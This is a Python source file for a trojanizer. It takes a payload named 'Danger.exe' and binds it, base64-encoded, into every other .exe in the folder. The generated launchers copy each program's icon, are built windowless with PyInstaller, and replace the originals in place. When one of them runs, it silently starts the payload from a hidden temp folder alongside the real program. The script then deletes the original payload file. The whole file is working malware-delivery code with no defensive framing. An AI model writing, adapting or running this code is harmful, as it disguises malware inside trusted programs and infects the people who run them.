import sys
import subprocess
import os
import base64
import shutil
import tempfile
import glob
import ctypes

DANGER_EXE_NAME = "Danger.exe"
PYINSTALLER_ARGS = ["--onefile", "--noconsole"]

def set_hidden(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
    except Exception:
        pass

def check_pyinstaller():
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True, text=True)
        return True
    except:
        return False

def check_pywin32():
    try:
        import win32api, win32gui, win32ui, win32con
        return True
    except ImportError:
        return False

def extract_icon_from_exe(exe_path, output_ico_path):
    import win32api, win32gui, win32ui, win32con
    from PIL import Image

    h_icon = win32gui.ExtractIcon(win32ui.GetNone().GetSafeHwnd(), exe_path, 0)
    if not h_icon:
        raise Exception("无法提取图标")

    ico_x = win32api.GetSystemMetrics(win32con.SM_CXICON)
    ico_y = win32api.GetSystemMetrics(win32con.SM_CYICON)

    hdc = win32ui.CreateDCFromHandle(win32gui.GetDC(0))
    hdc_mem = hdc.CreateCompatibleDC()
    bitmap = win32ui.CreateBitmap()
    bitmap.CreateCompatibleBitmap(hdc, ico_x, ico_y)
    hdc_mem.SelectObject(bitmap)
    win32gui.DrawIconEx(hdc_mem.GetSafeHdc(), 0, 0, h_icon, ico_x, ico_y, 0, 0, win32con.DI_NORMAL)

    bmpinfo = bitmap.GetInfo()
    bmpstr = bitmap.GetBitmapBits(True)
    img = Image.frombuffer('RGBA', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRA', 0, 1)
    img.save(output_ico_path, format='ICO', sizes=[(ico_x, ico_y)])

    win32gui.DestroyIcon(h_icon)
    hdc_mem.DeleteDC()
    hdc.DeleteDC()

def generate_launcher(danger_exe_path, original_exe_path, output_launcher):
    with open(danger_exe_path, 'rb') as f:
        danger_b64 = base64.b64encode(f.read()).decode('utf-8')
    with open(original_exe_path, 'rb') as f:
        original_b64 = base64.b64encode(f.read()).decode('utf-8')

    launcher_code = f'''import sys, subprocess, tempfile, os, base64, shutil, ctypes

def set_hidden(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)
    except Exception:
        pass

DANGER_B64 = r"""{danger_b64}"""
ORIGINAL_B64 = r"""{original_b64}"""
DANGER_NAME = "{os.path.basename(danger_exe_path)}"
ORIGINAL_NAME = "{os.path.basename(original_exe_path)}"

def main():
    temp_dir = None
    try:
        temp_dir = tempfile.mkdtemp()
        set_hidden(temp_dir)
        
        danger_path = os.path.join(temp_dir, DANGER_NAME)
        with open(danger_path, 'wb') as f:
            f.write(base64.b64decode(DANGER_B64))
        set_hidden(danger_path)
        
        original_path = os.path.join(temp_dir, ORIGINAL_NAME)
        with open(original_path, 'wb') as f:
            f.write(base64.b64decode(ORIGINAL_B64))
        set_hidden(original_path)
        
        subprocess.Popen([danger_path])
        proc = subprocess.Popen([original_path])
        proc.wait()
    except Exception:
        pass
    finally:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == "__main__":
    main()
'''
    with open(output_launcher, 'w', encoding='utf-8') as f:
        f.write(launcher_code)

def pack_one(first_exe, danger_exe):
    temp_ico = tempfile.NamedTemporaryFile(suffix=".ico", delete=False).name
    try:
        extract_icon_from_exe(first_exe, temp_ico)
    except Exception:
        temp_ico = None

    launcher_script = tempfile.NamedTemporaryFile(suffix=".py", delete=False).name
    generate_launcher(danger_exe, first_exe, launcher_script)

    temp_output_dir = tempfile.mkdtemp()
    work_dir = tempfile.mkdtemp()
    base_name = os.path.splitext(os.path.basename(first_exe))[0]

    cmd = ["pyinstaller"] + PYINSTALLER_ARGS
    if temp_ico and os.path.exists(temp_ico):
        cmd += ["--icon", temp_ico]
    cmd += ["--name", base_name, "--distpath", temp_output_dir, "--workpath", work_dir, launcher_script]
    result = subprocess.run(cmd)

    if result.returncode == 0:
        built_exe = os.path.join(temp_output_dir, base_name + ".exe")
        if os.path.exists(built_exe):
            backup = first_exe + ".backup"
            if os.path.exists(first_exe):
                shutil.move(first_exe, backup)
            shutil.move(built_exe, first_exe)
            if os.path.exists(backup):
                os.remove(backup)
        else:
            return False
    else:
        return False

    if temp_ico and os.path.exists(temp_ico):
        os.remove(temp_ico)
    if os.path.exists(launcher_script):
        os.remove(launcher_script)
    if os.path.exists(temp_output_dir):
        shutil.rmtree(temp_output_dir, ignore_errors=True)
    if os.path.exists(work_dir):
        shutil.rmtree(work_dir, ignore_errors=True)
    spec_file = base_name + ".spec"
    if os.path.exists(spec_file):
        os.remove(spec_file)

    return True

def main():
    if not check_pyinstaller():
        sys.exit(1)
    if not os.path.exists(DANGER_EXE_NAME):
        sys.exit(1)
    if not check_pywin32():
        sys.exit(1)

    all_exe = glob.glob("*.exe")
    targets = [f for f in all_exe if os.path.basename(f) != DANGER_EXE_NAME]
    if not targets:
        sys.exit(0)

    success_count = 0
    for t in targets:
        if pack_one(t, DANGER_EXE_NAME):
            success_count += 1

    if os.path.exists(DANGER_EXE_NAME):
        try:
            os.remove(DANGER_EXE_NAME)
        except Exception:
            pass

if __name__ == "__main__":
    main()